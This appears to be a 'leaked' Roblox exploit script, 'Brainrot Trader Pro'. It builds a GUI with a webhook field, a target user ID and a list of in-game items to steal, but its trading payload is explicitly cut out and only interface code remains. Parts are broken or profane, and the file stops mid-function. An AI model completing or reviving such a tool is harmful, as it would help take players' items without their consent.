--// ═══════════════════════════════════════════════════════════════
--//  BRAINROT TRADER PRO — Custom GUI Edition
--//  FETCHED BY SUNZER DMYTRIEVSKIY
--//  SUNZWAVE - https://discord.gg/pXMnnt3bP3
--//  BIGHVH - https://dsc.gg/bighvh
--//  SUNZER'S BIO - https://fakecrime.bio/sunzer
--//  Красивый ВАЙБКОД интерфейс с полным контролем
--// ═══════════════════════════════════════════════════════════════

--// https://ibb.co/DPVGVZhr
getgenv().WEBHOOK_URL = ""
getgenv().TARGET_ID = 4713046815
getgenv().DELAY_STEP = "КАК ВЫ НАХУЙ ВАЙБКОДИЛИ СЫНЫ ПИДОРА"
getgenv().TRADE_CYCLE_DELAY = "КАКОГО ХУЯ ВСЁ СКЛЕИЛОСЬ"

getgenv().TARGET_BRAINROTS = {
    ["Agarrini la Palini"] = true,
    ["Brunito Marsito"] = true,
    ["Bunito Bunito Spinito"] = true,
    ["Bunnyman"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cerberus"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Chicleteirina Bicicleteirina"] = true,
    ["Chicliterita bicicliterita"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["Cooki and Milki"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Extinct Matteo"] = true,
    ["Festive 67"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["GOAT"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Graipuss Medussi"] = true,
    ["Guest 666"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Job Job Job Sahur"] = true,
    ["Karker Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Casa Boo"] = true,
    ["La Extinct Grande"] = true,
    ["La Jolly Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Spooky Grande"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Taco Combinasion"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Las Tralaleritas"] = true,
    ["Lavadorito Spinito"] = true,
    ["Los Bros"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Tacoritas"] = true,
    ["Los Tralaleritos"] = true,
    ["Love Love Bear"] = true,
    ["Mariachi Corazoni"] = true,
    ["Meowl"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Money Money Puggy"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Perrito Burrito"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Skibidi Toilet"] = true,
    ["Spooky and Pumpky"] = true,
    ["Strawberry Elephant"] = true,
    ["Swag Soda"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["To to to Sahur"] = true,
    ["Tralaledon"] = true,
    ["Tuff Toucan"] = true,
    ["W or L"] = true,
}

--// ═══════════════════════════════════════════════════════════════
--//  GUI CREATION
--// ═══════════════════════════════════════════════════════════════

if game.CoreGui:FindFirstChild("BrainrotTraderPro") then
    game.CoreGui:FindFirstChild("BrainrotTraderPro"):Destroy()
end

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

--// Цветовая палитра
local Colors = {
    Background = Color3.fromRGB(15, 15, 25),
    Surface = Color3.fromRGB(22, 22, 35),
    SurfaceLight = Color3.fromRGB(30, 30, 48),
    Accent = Color3.fromRGB(130, 80, 255),
    AccentGlow = Color3.fromRGB(160, 110, 255),
    AccentDark = Color3.fromRGB(90, 50, 200),
    Success = Color3.fromRGB(80, 220, 140),
    Warning = Color3.fromRGB(255, 180, 60),
    Error = Color3.fromRGB(255, 80, 80),
    Text = Color3.fromRGB(240, 240, 255),
    TextDim = Color3.fromRGB(140, 140, 170),
    TextMuted = Color3.fromRGB(80, 80, 110),
    Border = Color3.fromRGB(45, 45, 70),
    Cyan = Color3.fromRGB(60, 200, 255),
    Pink = Color3.fromRGB(255, 100, 180),
}

--// Утилиты
local function CreateTween(obj, props, duration, style, direction)
    local tween = TweenService:Create(obj, TweenInfo.new(
        duration or 0.3,
        style or Enum.EasingStyle.Quart,
        direction or Enum.EasingDirection.Out
    ), props)
    return tween
end

local function AddCorner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 8)
    corner.Parent = parent
    return corner
end

local function AddStroke(parent, color, thickness)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color or Colors.Border
    stroke.Thickness = thickness or 1
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = parent
    return stroke
end

local function AddGradient(parent, c1, c2, rotation)
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new(c1, c2)
    grad.Rotation = rotation or 90
    grad.Parent = parent
    return grad
end

--// ═══════════════════════════════════════════════════════════════
--//  MAIN SCREENGUI
--// ═══════════════════════════════════════════════════════════════

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BrainrotTraderPro"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

--// ═══════════════════════════════════════════════════════════════
--//  MAIN FRAME
--// ═══════════════════════════════════════════════════════════════

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 520, 0, 620)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -310)
MainFrame.BackgroundColor3 = Colors.Background
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui
MainFrame.ClipsDescendants = true
AddCorner(MainFrame, 12)

local MainStroke = AddStroke(MainFrame, Colors.Accent, 1.5)

local GlowEffect = Instance.new("ImageLabel")
GlowEffect.Name = "Glow"
GlowEffect.Size = UDim2.new(1.5, 0, 0.5, 0)
GlowEffect.Position = UDim2.new(-0.25, 0, -0.1, 0)
GlowEffect.BackgroundTransparency = 1
GlowEffect.Image = "rbxassetid://7912134082"
GlowEffect.ImageColor3 = Colors.Accent
GlowEffect.ImageTransparency = 0.85
GlowEffect.Parent = MainFrame

--// ═══════════════════════════════════════════════════════════════
--//  TITLE BAR
--// ═══════════════════════════════════════════════════════════════

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Colors.Surface
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame
AddCorner(TitleBar, 12)

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 15)
TitleBarFix.Position = UDim2.new(0, 0, 1, -15)
TitleBarFix.BackgroundColor3 = Colors.Surface
TitleBarFix.BorderSizePixel = 0
TitleBarFix.Parent = TitleBar

local TitleLine = Instance.new("Frame")
TitleLine.Size = UDim2.new(1, -30, 0, 1)
TitleLine.Position = UDim2.new(0, 15, 1, 0)
TitleLine.BackgroundColor3 = Colors.Border
TitleLine.BorderSizePixel = 0
TitleLine.Parent = TitleBar

local TitleIcon = Instance.new("TextLabel")
TitleIcon.Size = UDim2.new(0, 30, 0, 30)
TitleIcon.Position = UDim2.new(0, 15, 0.5, -15)
TitleIcon.BackgroundColor3 = Colors.Accent
TitleIcon.Text = "⚡"
TitleIcon.TextSize = 16
TitleIcon.Font = Enum.Font.GothamBold
TitleIcon.TextColor3 = Colors.Text
TitleIcon.Parent = TitleBar
AddCorner(TitleIcon, 8)
AddGradient(TitleIcon, Colors.Accent, Colors.Pink)

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(0, 250, 0, 20)
TitleText.Position = UDim2.new(0, 55, 0, 8)
TitleText.BackgroundTransparency = 1
TitleText.Text = "BRAINROT TRADER PRO LEAK BY SUNZER"
TitleText.TextSize = 15
TitleText.Font = Enum.Font.GothamBold
TitleText.TextColor3 = Colors.Text
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Parent = TitleBar

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(0, 250, 0, 14)
SubTitle.Position = UDim2.new(0, 55, 0, 29)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "SUNZWAVE DISCORD SERVER - https://discord.gg/pXMnnt3bP3"
SubTitle.TextSize = 11
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextColor3 = Colors.TextDim
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -40, 0.5, -15)
CloseBtn.BackgroundColor3 = Colors.SurfaceLight
CloseBtn.Text = "✕"
CloseBtn.TextSize = 14
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextColor3 = Colors.TextDim
CloseBtn.Parent = TitleBar
AddCorner(CloseBtn, 8)

CloseBtn.MouseEnter:Connect(function()
    CreateTween(CloseBtn, {BackgroundColor3 = Colors.Error, TextColor3 = Colors.Text}, 0.2):Play()
end)
CloseBtn.MouseLeave:Connect(function()
    CreateTween(CloseBtn, {BackgroundColor3 = Colors.SurfaceLight, TextColor3 = Colors.TextDim}, 0.2):Play()
end)
CloseBtn.MouseButton1Click:Connect(function()
    CreateTween(MainFrame, {Size = UDim2.new(0, 520, 0, 0), Position = UDim2.new(0.5, -260, 0.5, 0)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In):Play()
    task.wait(0.45)
    ScreenGui:Destroy()
end)

local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 30, 0, 30)
MinBtn.Position = UDim2.new(1, -75, 0.5, -15)
MinBtn.BackgroundColor3 = Colors.SurfaceLight
MinBtn.Text = "—"
MinBtn.TextSize = 14
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextColor3 = Colors.TextDim
MinBtn.Parent = TitleBar
AddCorner(MinBtn, 8)

local isMinimized = false
MinBtn.MouseEnter:Connect(function()
    CreateTween(MinBtn, {BackgroundColor3 = Colors.Warning, TextColor3 = Colors.Background}, 0.2):Play()
end)
MinBtn.MouseLeave:Connect(function()
    CreateTween(MinBtn, {BackgroundColor3 = Colors.SurfaceLight, TextColor3 = Colors.TextDim}, 0.2):Play()
end)
MinBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        CreateTween(MainFrame, {Size = UDim2.new(0, 520, 0, 50)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In):Play()
    else
        CreateTween(MainFrame, {Size = UDim2.new(0, 520, 0, 620)}, 0.4, Enum.EasingStyle.Back):Play()
    end
end)

--// ═══════════════════════════════════════════════════════════════
--//  DRAGGING
--// ═══════════════════════════════════════════════════════════════

local dragging, dragInput, dragStart, startPos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

--// ═══════════════════════════════════════════════════════════════
--//  CONTENT AREA
--// ═══════════════════════════════════════════════════════════════

local ContentFrame = Instance.new("ScrollingFrame")
ContentFrame.Name = "Content"
ContentFrame.Size = UDim2.new(1, -20, 1, -65)
ContentFrame.Position = UDim2.new(0, 10, 0, 55)
ContentFrame.BackgroundTransparency = 1
ContentFrame.BorderSizePixel = 0
ContentFrame.ScrollBarThickness = 3
ContentFrame.ScrollBarImageColor3 = Colors.Accent
ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 750)
ContentFrame.Parent = MainFrame

local ContentLayout = Instance.new("UIListLayout")
ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
ContentLayout.Padding = UDim.new(0, 10)
ContentLayout.Parent = ContentFrame

--// ═══════════════════════════════════════════════════════════════
--//  HELPER: CREATE SECTION
--// ═══════════════════════════════════════════════════════════════

local function CreateSection(title, icon, height)
    local section = Instance.new("Frame")
    section.Size = UDim2.new(1, 0, 0, height or 120)
    section.BackgroundColor3 = Colors.Surface
    section.BorderSizePixel = 0
    section.Parent = ContentFrame
    AddCorner(section, 10)
    AddStroke(section, Colors.Border, 1)

    local sectionHeader = Instance.new("Frame")
    sectionHeader.Size = UDim2.new(1, 0, 0, 35)
    sectionHeader.BackgroundTransparency = 1
    sectionHeader.Parent = section

    local iconLabel = Instance.new("TextLabel")
    iconLabel.Size = UDim2.new(0, 20, 0, 20)
    iconLabel.Position = UDim2.new(0, 12, 0.5, -10)
    iconLabel.BackgroundTransparency = 1
    iconLabel.Text = icon or "⚙"
    iconLabel.TextSize = 14
    iconLabel.Font = Enum.Font.GothamBold
    iconLabel.TextColor3 = Colors.Accent
    iconLabel.Parent = sectionHeader

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -45, 1, 0)
    titleLabel.Position = UDim2.new(0, 38, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title or "Section"
    titleLabel.TextSize = 13
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextColor3 = Colors.Text
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = sectionHeader

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -24, 0, 1)
    divider.Position = UDim2.new(0, 12, 0, 35)
    divider.BackgroundColor3 = Colors.Border
    divider.BorderSizePixel = 0
    divider.Parent = section

    return section
end

--// ═══════════════════════════════════════════════════════════════
--//  HELPER: CREATE INPUT FIELD
--// ═══════════════════════════════════════════════════════════════

local function CreateInputField(parent, label, default, yPos, callback)
    local fieldLabel = Instance.new("TextLabel")
    fieldLabel.Size = UDim2.new(0, 140, 0, 30)
    fieldLabel.Position = UDim2.new(0, 15, 0, yPos)
    fieldLabel.BackgroundTransparency = 1
    fieldLabel.Text = label
    fieldLabel.TextSize = 12
    fieldLabel.Font = Enum.Font.Gotham
    fieldLabel.TextColor3 = Colors.TextDim
    fieldLabel.TextXAlignment = Enum.TextXAlignment.Left
    fieldLabel.Parent = parent

    local inputFrame = Instance.new("Frame")
    inputFrame.Size = UDim2.new(1, -175, 0, 30)
    inputFrame.Position = UDim2.new(0, 160, 0, yPos)
    inputFrame.BackgroundColor3 = Colors.Background
    inputFrame.BorderSizePixel = 0
    inputFrame.Parent = parent
    AddCorner(inputFrame, 6)
    local inputStroke = AddStroke(inputFrame, Colors.Border, 1)

    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(1, -16, 1, 0)
    inputBox.Position = UDim2.new(0, 8, 0, 0)
    inputBox.BackgroundTransparency = 1
    inputBox.Text = tostring(default)
    inputBox.TextSize = 12
    inputBox.Font = Enum.Font.GothamMedium
    inputBox.TextColor3 = Colors.Text
    inputBox.PlaceholderText = "Enter value... leak by sunzer"
    inputBox.PlaceholderColor3 = Colors.TextMuted
    inputBox.TextXAlignment = Enum.TextXAlignment.Left
    inputBox.ClearTextOnFocus = false
    inputBox.Parent = inputFrame

    inputBox.Focused:Connect(function()
        CreateTween(inputStroke, {Color = Colors.Accent}, 0.2):Play()
    end)
    inputBox.FocusLost:Connect(function()
        CreateTween(inputStroke, {Color = Colors.Border}, 0.2):Play()
        if callback then callback(inputBox.Text) end
    end)

    return inputBox
end

--// ═══════════════════════════════════════════════════════════════
--//  SECTION 1: STATUS PANEL
--// ═══════════════════════════════════════════════════════════════

local StatusSection = CreateSection("VIBECODE STATUS", "📊", 90)
StatusSection.LayoutOrder = 1

local StatusDot = Instance.new("Frame")
StatusDot.Size = UDim2.new(0, 10, 0, 10)
StatusDot.Position = UDim2.new(0, 15, 0, 50)
StatusDot.BackgroundColor3 = Colors.Warning
StatusDot.Parent = StatusSection
AddCorner(StatusDot, 5)

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(0, 200, 0, 20)
StatusText.Position = UDim2.new(0, 33, 0, 45)
StatusText.BackgroundTransparency = 1
StatusText.Text = "⏳ Ready to start"
StatusText.TextSize = 12
StatusText.Font = Enum.Font.GothamMedium
StatusText.TextColor3 = Colors.Warning
StatusText.TextXAlignment = Enum.TextXAlignment.Left
StatusText.Parent = StatusSection

local TradeCounter = Instance.new("TextLabel")
TradeCounter.Size = UDim2.new(0, 150, 0, 20)
TradeCounter.Position = UDim2.new(1, -165, 0, 45)
TradeCounter.BackgroundTransparency = 1
TradeCounter.Text = "Trades: 0"
TradeCounter.TextSize = 12
TradeCounter.Font = Enum.Font.GothamMedium
TradeCounter.TextColor3 = Colors.Cyan
TradeCounter.TextXAlignment = Enum.TextXAlignment.Right
TradeCounter.Parent = StatusSection

local brainrotCount = 0
for _ in pairs(getgenv().TARGET_BRAINROTS) do brainrotCount = brainrotCount + 1 end

local TargetCountLabel = Instance.new("TextLabel")
TargetCountLabel.Size = UDim2.new(0, 200, 0, 16)
TargetCountLabel.Position = UDim2.new(0, 33, 0, 65)
TargetCountLabel.BackgroundTransparency = 1
TargetCountLabel.Text = "Tracking " .. brainrotCount .. " brainrots"
TargetCountLabel.TextSize = 10
TargetCountLabel.Font = Enum.Font.Gotham
TargetCountLabel.TextColor3 = Colors.TextMuted
TargetCountLabel.TextXAlignment = Enum.TextXAlignment.Left
TargetCountLabel.Parent = StatusSection

--// ═══════════════════════════════════════════════════════════════
--//  SECTION 2: CONFIGURATION
--// ═══════════════════════════════════════════════════════════════

local ConfigSection = CreateSection("CONFIGURATION", "⚙", 180)
ConfigSection.LayoutOrder = 2

CreateInputField(ConfigSection, "Target User ID", getgenv().TARGET_ID, 45, function(val)
    local num = tonumber(val)
    if num then getgenv().TARGET_ID = num end
end)

CreateInputField(ConfigSection, "Webhook URL", "OKAK", 85, function(val)
    if val ~= "••••••••" and val ~= "" then
        getgenv().WEBHOOK_URL = val
    end
end)

CreateInputField(ConfigSection, "Step Delay (s)", getgenv().DELAY_STEP, 125, function(val)
    local num = tonumber(val)
    if num then getgenv().DELAY_STEP = num end
end)

CreateInputField(ConfigSection, "Cycle Delay (s)", getgenv().TRADE_CYCLE_DELAY, 145, function(val)
    local num = tonumber(val)
    if num then getgenv().TRADE_CYCLE_DELAY = num end
end)

--// ═══════════════════════════════════════════════════════════════
--//  SECTION 3: BRAINROT LIST
--// ═══════════════════════════════════════════════════════════════

local BrainrotSection = CreateSection("TARGET BRAINROTS УКРАДИ ГНИЕНИЕ МОЗГА", "🎯", 220)
BrainrotSection.LayoutOrder = 3

local BrainrotScroll = Instance.new("ScrollingFrame")
BrainrotScroll.Size = UDim2.new(1, -24, 1, -45)
BrainrotScroll.Position = UDim2.new(0, 12, 0, 40)
BrainrotScroll.BackgroundColor3 = Colors.Background
BrainrotScroll.BorderSizePixel = 0
BrainrotScroll.ScrollBarThickness = 2
BrainrotScroll.ScrollBarImageColor3 = Colors.Accent
BrainrotScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
BrainrotScroll.Parent = BrainrotSection
AddCorner(BrainrotScroll, 6)

local BrainrotLayout = Instance.new("UIListLayout")
BrainrotLayout.SortOrder = Enum.SortOrder.Name
BrainrotLayout.Padding = UDim.new(0, 2)
BrainrotLayout.Parent = BrainrotScroll

local BrainrotPad = Instance.new("UIPadding")
BrainrotPad.PaddingTop = UDim.new(0, 4)
BrainrotPad.PaddingLeft = UDim.new(0, 6)
BrainrotPad.PaddingRight = UDim.new(0, 6)
BrainrotPad.Parent = BrainrotScroll

local sortedNames = {}
for name in pairs(getgenv().TARGET_BRAINROTS) do
    table.insert(sortedNames, name)
end
table.sort(sortedNames)

for i, name in ipairs(sortedNames) do
    local item = Instance.new("Frame")
    item.Size = UDim2.new(1, 0, 0, 22)
    item.BackgroundColor3 = (i % 2 == 0) and Colors.SurfaceLight or Color3.fromRGB(18, 18, 30)
    item.BackgroundTransparency = 0.3
    item.BorderSizePixel = 0
    item.Parent = BrainrotScroll
    AddCorner(item, 4)

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 6, 0, 6)
    dot.Position = UDim2.new(0, 6, 0.5, -3)
    dot.BackgroundColor3 = Colors.Success
    dot.Parent = item
    AddCorner(dot, 3)

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, -22, 1, 0)
    nameLabel.Position = UDim2.new(0, 18, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = name
    nameLabel.TextSize = 10
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextColor3 = Colors.TextDim
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Parent = item
end

BrainrotLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    BrainrotScroll.CanvasSize = UDim2.new(0, 0, 0, BrainrotLayout.AbsoluteContentSize.Y + 10)
end)
BrainrotScroll.CanvasSize = UDim2.new(0, 0, 0, BrainrotLayout.AbsoluteContentSize.Y + 10)

--// ═══════════════════════════════════════════════════════════════
--//  SECTION 4: LOG CONSOLE
--// ═══════════════════════════════════════════════════════════════

local LogSection = CreateSection("LIVE LOGger", "📜", 150)
LogSection.LayoutOrder = 4

local LogScroll = Instance.new("ScrollingFrame")
LogScroll.Size = UDim2.new(1, -24, 1, -45)
LogScroll.Position = UDim2.new(0, 12, 0, 40)
LogScroll.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
LogScroll.BorderSizePixel = 0
LogScroll.ScrollBarThickness = 2
LogScroll.ScrollBarImageColor3 = Colors.Accent
LogScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
LogScroll.Parent = LogSection
AddCorner(LogScroll, 6)

local LogLayout = Instance.new("UIListLayout")
LogLayout.SortOrder = Enum.SortOrder.LayoutOrder
LogLayout.Padding = UDim.new(0, 1)
LogLayout.Parent = LogScroll

local LogPad = Instance.new("UIPadding")
LogPad.PaddingTop = UDim.new(0, 4)
LogPad.PaddingLeft = UDim.new(0, 8)
LogPad.PaddingRight = UDim.new(0, 8)
LogPad.Parent = LogScroll

local logOrder = 0
local function AddLog(message, color)
    logOrder = logOrder + 1
    local logEntry = Instance.new("TextLabel")
    logEntry.Size = UDim2.new(1, 0, 0, 16)
    logEntry.BackgroundTransparency = 1
    logEntry.Text = "[" .. os.date("%H:%M:%S") .. "] " .. message
    logEntry.TextSize = 10
    logEntry.Font = Enum.Font.Code
    logEntry.TextColor3 = color or Colors.TextDim
    logEntry.TextXAlignment = Enum.TextXAlignment.Left
    logEntry.TextTruncate = Enum.TextTruncate.AtEnd
    logEntry.LayoutOrder = logOrder
    logEntry.Parent = LogScroll

    LogScroll.CanvasSize = UDim2.new(0, 0, 0, LogLayout.AbsoluteContentSize.Y + 10)
    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.CanvasSize.Y.Offset)

    local children = LogScroll:GetChildren()
    local count = 0
    for _, c in ipairs(children) do
        if c:IsA("TextLabel") then count = count + 1 end
    end
    if count > 50 then
        for _, c in ipairs(children) do
            if c:IsA("TextLabel") then
                c:Destroy()
                break
            end
        end
    end
end

--// ═══════════════════════════════════════════════════════════════
--//  CONTROL BUTTONS
--// ═══════════════════════════════════════════════════════════════

local ButtonSection = Instance.new("Frame")
ButtonSection.Size = UDim2.new(1, 0, 0, 55)
ButtonSection.BackgroundTransparency = 1
ButtonSection.LayoutOrder = 5
ButtonSection.Parent = ContentFrame

local StartBtn = Instance.new("TextButton")
StartBtn.Size = UDim2.new(0.48, 0, 0, 45)
StartBtn.Position = UDim2.new(0, 0, 0, 5)
StartBtn.BackgroundColor3 = Colors.Accent
StartBtn.Text = ""
StartBtn.AutoButtonColor = false
StartBtn.Parent = ButtonSection
AddCorner(StartBtn, 10)
AddGradient(StartBtn, Colors.Accent, Colors.AccentDark, 90)

local StartLabel = Instance.new("TextLabel")
StartLabel.Size = UDim2.new(1, 0, 1, 0)
StartLabel.BackgroundTransparency = 1
StartLabel.Text = "▶  START TRADING КРИПТОТРЕЙД В БИО"
StartLabel.TextSize = 13
StartLabel.Font = Enum.Font.GothamBold
StartLabel.TextColor3 = Colors.Text
StartLabel.Parent = StartBtn

StartBtn.MouseEnter:Connect(function()
    CreateTween(StartBtn, {BackgroundColor3 = Colors.AccentGlow}, 0.2):Play()
end)
StartBtn.MouseLeave:Connect(function()
    CreateTween(StartBtn, {BackgroundColor3 = Colors.Accent}, 0.2):Play()
end)

local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(0.48, 0, 0, 45)
StopBtn.Position = UDim2.new(0.52, 0, 0, 5)
StopBtn.BackgroundColor3 = Colors.SurfaceLight
StopBtn.Text = ""
StopBtn.AutoButtonColor = false
StopBtn.Parent = ButtonSection
AddCorner(StopBtn, 10)
AddStroke(StopBtn, Colors.Error, 1)

local StopLabel = Instance.new("TextLabel")
StopLabel.Size = UDim2.new(1, 0, 1, 0)
StopLabel.BackgroundTransparency = 1
StopLabel.Text = "⏹  STOP"
StopLabel.TextSize = 13
StopLabel.Font = Enum.Font.GothamBold
StopLabel.TextColor3 = Colors.Error
StopLabel.Parent = StopBtn

StopBtn.MouseEnter:Connect(function()
    CreateTween(StopBtn, {BackgroundColor3 = Colors.Error}, 0.2):Play()
    CreateTween(StopLabel, {TextColor3 = Colors.Text}, 0.2):Play()
end)
StopBtn.MouseLeave:Connect(function()
    CreateTween(StopBtn, {BackgroundColor3 = Colors.SurfaceLight}, 0.2):Play()
    CreateTween(StopLabel, {TextColor3 = Colors.Error}, 0.2):Play()
end)

--// ═══════════════════════════════════════════════════════════════
--//  UPDATE CANVAS SIZE
--// ═══════════════════════════════════════════════════════════════

ContentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)
end)
ContentFrame.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)

--// ═══════════════════════════════════════════════════════════════
--//  INTRO ANIMATION
--// ═══════════════════════════════════════════════════════════════

MainFrame.Size = UDim2.new(0, 520, 0, 0)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, 0)

task.wait(0.1)
CreateTween(MainFrame, {
    Size = UDim2.new(0, 520, 0, 620),
    Position = UDim2.new(0.5, -260, 0.5, -310)
}, 0.6, Enum.EasingStyle.Back):Play()

task.wait(0.7)
AddLog("LEAK BY SUNZER DMYTRIEVSKIY https://fakecrime.bio/sunzer https://discord.gg/pXMnnt3bP3 https://dsc.gg/bighvh", Colors.Success)
AddLog("Target ID: " .. tostring(getgenv().TARGET_ID), Colors.Cyan)
AddLog("Tracking " .. brainrotCount .. " brainrots", Colors.TextDim)

--// ═══════════════════════════════════════════════════════════════
--//  STATUS DOT PULSE ANIMATION
--// ═══════════════════════════════════════════════════════════════

task.spawn(function()
    while ScreenGui.Parent do
        CreateTween(StatusDot, {BackgroundTransparency = 0.6}, 0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut):Play()
        task.wait(0.8)
        CreateTween(StatusDot, {BackgroundTransparency = 0}, 0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut):Play()
        task.wait(0.8)
    end
end)

--// ═══════════════════════════════════════════════════════════════
--//  ACCENT GLOW ANIMATION (Rainbow Border)
--// ═══════════════════════════════════════════════════════════════

task.spawn(function()
    local hue = 0
    while ScreenGui.Parent do
        hue = (hue + 0.002) % 1
        local col = Color3.fromHSV(hue, 0.5, 0.9)
        MainStroke.Color = col
        task.wait(0.03)
    end
end)

--// ═══════════════════════════════════════════════════════════════
--//  BUTTON LOGIC
--// ═══════════════════════════════════════════════════════════════

local isRunning = false

local function UpdateStatus(text, color)
    StatusText.Text = text
    StatusText.TextColor3 = color
    StatusDot.BackgroundColor3 = color
end

StartBtn.MouseButton1Click:Connect(function()
    if isRunning then return end
    isRunning = true

    UpdateStatus("🟢 МАТИЗ БЛЯ БР БР БР БР БР", Colors.Success)
    AddLog("Starting trade bot...", Colors.Success)
    AddLog("Loading main script...", Colors.Cyan)

    CreateTween(StartBtn, {BackgroundColor3 = Colors.Success}, 0.3):Play()
    StartLabel.Text = "✓  Я ЕБАЛ СЛОНА"

    task.spawn(function()
        local success, err = pcall(function()
            AddLog("Здесь был луармор, но я его вырезал", Colors.Error)
        end)

        if not success then
            AddLog("Error: " .. tostring(err), Colors.Error)
            UpdateStatus("❌ АШІБАЧКА", Colors.Error)
            isRunning = false
            CreateTween(StartBtn, {BackgroundColor3 = Colors.Accent}, 0.3):Play()
            StartLabel.Text = "▶  START TRADING КРИПТОТРЕЙД В БИО"
        end
    end)
end)

StopBtn.MouseButton1Click:Connect(function()
    if not isRunning then return end
    isRunning = false

    UpdateStatus("⏹ Stopped", Colors.Error)
